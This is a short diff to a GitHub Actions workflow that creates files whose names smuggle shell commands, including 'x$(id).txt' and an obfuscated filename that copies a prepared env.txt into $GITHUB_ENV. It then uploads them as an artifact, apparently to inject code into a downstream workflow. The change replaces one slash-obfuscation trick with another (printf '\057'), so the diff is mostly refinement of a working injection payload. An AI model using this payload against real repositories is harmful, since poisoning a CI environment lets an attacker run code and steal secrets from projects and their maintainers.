@@ -27,8 +27,7 @@ jobs:
           console.log(s);
           JS
           touch 'x$(id).txt'
-          W='${PWD:0:1}'
-          touch "x\$(cp\${IFS}$W""tmp$W""content$W""content$W""env.txt\${IFS}\$GITHUB_ENV).txt"
+          touch "x\$(cp\${IFS}\$(printf\${IFS}'\\057')tmp\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')env.txt\${IFS}\$GITHUB_ENV).txt"
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
